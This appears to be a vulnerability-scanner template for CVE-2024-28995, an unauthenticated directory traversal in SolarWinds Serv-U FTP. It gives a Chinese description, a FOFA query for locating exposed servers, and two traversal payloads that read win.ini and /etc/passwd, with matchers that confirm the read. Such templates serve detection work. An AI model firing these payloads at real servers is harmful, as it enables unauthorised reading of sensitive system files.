id: CVE-2024-28995

info:
  name: SolarWinds Serv-U FTP 目录遍历文件读取漏洞
  author: fgz
  severity: high
  description: |
    SolarWinds Serv-U FTP 是一款由SolarWinds公司开发的FTP服务器软件，它提供了一种安全、可靠的方式来管理和传输文件。2024年6月，官方发布安全更新，修复CVE-2024-28995 SolarWinds Serv-U FTP 目录遍历文件读取漏洞，攻击者无需登陆即可构造恶意请求读取系统上文件，造成敏感信息泄漏。
  metadata:
    verified: true
    fofa-query: server="Serv-U"
  tags: cve,cve2024

http:
  - method: GET
    path:
      - "{{BaseURL}}/?InternalDir=/../../../../windows&InternalFile=win.ini"
      - "{{BaseURL}}/?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body, '; for 16-bit app support') || contains(body, '/root:/bin/bash')"